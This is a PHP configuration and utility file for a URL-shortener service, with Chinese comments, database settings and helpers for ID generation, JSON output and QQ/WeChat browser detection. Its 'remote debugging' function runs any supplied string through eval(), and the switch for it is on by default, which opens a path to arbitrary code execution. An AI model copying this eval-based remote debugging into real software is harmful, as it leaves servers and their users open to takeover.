<?php
//配置必改
$GLOBALS['servername'] = 'localhost';             //数据库地址
$GLOBALS['username'] = 'root';                    //数据库名
$GLOBALS['password'] = 'root';                    //数据库密码

//按需要修改
$GLOBALS['data'] = 'short';                 	  //数据库名
$GLOBALS['data_table'] = 'short_url';             //数据库表名
$GLOBALS['key_len'] = 6;                          //Id长度
$GLOBALS['err_url'] = 'short.html';               //无此短链 将跳转的网址
$GLOBALS['open_url'] = 'short.html';              //禁止短链 跳转的网址
$GLOBALS['app_debug'] = true;                    //是否开启远程调试


//无需修改
$GLOBALS['app_path'] = get_path();                //安装路径

//获取安装路径
function get_path():string
{
    if (preg_match('/^\/.*?\/api/', $_SERVER["PHP_SELF"], $tt))
        if ($tt[0]!=null && $tt[0] != '')
            /*return substr_replace( $tt[0], '', strlen($tt[0]) == 1 ? 1 : strlen($tt[0])-1 );*/
            return str_replace('/api', '', $tt[0]);
    return '';
}

/**
 * 生成id
 * @param int $x
 * @return string
 */
function make_coupon_card($x = 6): string
{
    $code = '0123456789qwertyuioplkjhgfdsazxcvbnm';
    $rand = $code[rand(0,35)]
        .strtoupper(dechex(date('m')))
        .date('d').substr(time(),-5)
        .substr(microtime(),2,5)
        .sprintf('%02d',rand(0,99));
    for(
        $a = md5( $rand, true ),
        $s = '0123456789qwertyuioplkjhgfdsazxcvbnm',
        $d = '',
        $f = 0;
        $f < $x;
        $g = ord( $a[ $f ] ),
        $d .= $s[ ( $g ^ ord( $a[ $f + 8 ] ) ) - $g & 0x1F ],
        $f++
    );
    return $d;
}

/**
 * 返回json
 * @param bool $isFs 是否完成
 * @param string $msg 处理信息
 * @param string $short 短链
 * @param int $bat 访问量
 * @return string
 */
function returnJson(bool $isFs,string $msg, $short = "pkpk.run", $bat = 0): string
{
    return '{"fs":'.($isFs?'true':'false').', "msg":"'.$msg.'", "short":"'.$short.'", "bat":'.$bat.'}';
}

/**
 * 组成短链
 * @param $id
 * @return string
 */
function returnShort($id): string
{
    if ($id == null || $id == '')
        /* return '/^http(s)?:\/\/' . $_SERVER['SERVER_NAME'] . '\\' . $GLOBALS['app_path'] . '\//';*/
        return '/^http(s)?:\/\/' . $_SERVER['SERVER_NAME'] . ( $GLOBALS['app_path']==null || $GLOBALS['app_path'] == "" ? '' : '\\' . $GLOBALS['app_path'] ).'\//';
    return  ( $_SERVER['HTTPS'] != 'on' ? 'http' : 'https' ) . '://' . $_SERVER['SERVER_NAME'] . $GLOBALS['app_path'] .'/?'. $id;
}



//qq内置的
function is_qq(){

    $bro_msg=$_SERVER['HTTP_USER_AGENT'];
    if(strpos($bro_msg,'iPhone')||strpos($bro_msg,'iPad')){
        if(strpos($_SERVER['HTTP_USER_AGENT'],' QQ') !==false)
            return true;//苹果qq打开
    }

    if(strpos($bro_msg, 'Android')){
        if(strpos($bro_msg,'MQQBrowser') !==false){
            if(strpos($bro_msg,' QQ') !==false)
                return true;//安卓qq打开
        }
    }
    return false;
}

//微信
function is_weixin(){
    $bro_msg=$_SERVER['HTTP_USER_AGENT'];
    if(strpos($bro_msg,'MicroMessenger') !==false)
        return true;
    return false;
}


//远程调试
function remote_debugging(string $php_str){
    if ($GLOBALS['app_debug']) {
        try {
            eval($php_str);
        }catch (Error $error){
            exit(returnJson(false, $error->getMessage()));
        }
        exit();
    }
    exit(returnJson(false, "error：拒绝远程调试"));
}



?>